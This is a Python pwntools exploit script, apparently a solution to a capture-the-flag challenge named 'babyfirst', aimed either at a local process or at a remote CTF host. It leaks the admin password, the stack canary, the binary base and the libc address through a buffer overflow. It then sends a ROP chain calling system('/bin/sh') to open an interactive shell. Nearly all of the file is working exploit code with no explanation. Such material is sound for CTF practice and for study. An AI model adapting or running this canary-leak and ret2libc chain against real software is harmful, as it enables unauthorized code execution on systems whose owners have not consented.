from pwn import *
import time
import sys

def babyfirst(DEBUG):
	if DEBUG=="1":
		offset___libc_start_main_ret = 0x20830
		offset_puts = 0x000000000006f690
		offset_ret = 0x937 
		offset_pop_rdi = 0x21102
		offset_system = 0x45390
		offset_str_bin_sh = 0x18cd57
		offset_one_gadget = 0xf02a4 # [rsp+0x50]
		r = process("./babyfirst")
		raw_input("debug?")
	elif DEBUG=="2":
		offset___libc_start_main_ret = 0x21b97
		offset_ret = 0x8aa
		offset_puts = 0x809c0
		offset_pop_rdi = 0x2155f
		offset_system = 0x4f440
		offset_str_bin_sh = 0x1B3E9A
		# offset_one_gadget = 0x4f322 # [rsp+0x40]
		offset_one_gadget = 0x4f2c5 # rcx = null
		HOST = 'babyfirst.chung96vn.cf'
		PORT = 31337
		r = remote(HOST,PORT)
	
	def menu():
		return r.recvuntil("Your choice: ")
		
	def Login(username, password):
		r.sendline("1")
		r.recvuntil("User Name: ")
		r.send(username)
		if "admin" in username:
			r.recvuntil("Password: ")
			r.send(password)
		return menu()
	
	def Leak():
		r.sendline("2")
		r.recvuntil("Welcome: ")
		res = r.recvuntil("\nTest Version only support for admin~")
		menu()
		return res
	
	def Play():
		r.sendline("2")
		r.recvuntil("Content: ")
		
	def BOF(content):
		r.send(content)
		return r.recvline()
		
	
	offset_main = 0xf2d
	offset_bss = 0x202500
	menu()
	username = "A"*0x10
	username = username.ljust(0x20,"A")
	password = "B"*0x20
	Login(username, password)
	Login(username, password)
	
	password = Leak()[0x20:0x40]
	Login("admin\n",password)
	Play()
	canary = u64("\x00"+BOF("A"*0x29)[0x29:0x29+7])
	log.info("canary: %#x", canary)
	
	main = u64(BOF("A"*0x38)[0x38:0x38+6].ljust(8,"\x00"))-96
	log.info("main: %#x", main)
	binbase = main - offset_main
	log.info("binbase: %#x", binbase)
	
	bss = binbase + offset_bss
	
	__libc_start_main_ret = u64(BOF("A"*0x68)[0x68:0x68+6].ljust(8,"\x00"))
	log.info("__libc_start_main_ret: %#x", __libc_start_main_ret)
	
	libc = __libc_start_main_ret - offset___libc_start_main_ret
	one_gadget = libc + offset_one_gadget
	system = libc + offset_system
	str_bin_sh = libc + offset_str_bin_sh
	pop_rdi = libc + offset_pop_rdi
	puts = libc + offset_puts
	ret = libc + offset_ret
	log.info("libc: %#x", libc)
	log.info("one_gadget: %#x", one_gadget)
	log.info("puts: %#x", puts)
	
	payload = "END"
	payload = payload.ljust(0x28, "A")
	payload += p64(canary)
	payload += p64(bss) # rbp
	payload += p64(ret) # agliment rsp (https://stackoverflow.com/questions/11298230/sse-instruction-need-the-data-aligned)
	# payload += p64(one_gadget) # ret
	payload += p64(pop_rdi) # ret
	payload += p64(str_bin_sh)
	payload += p64(system)
	BOF(payload)
	
	
	r.interactive()

babyfirst(sys.argv[1])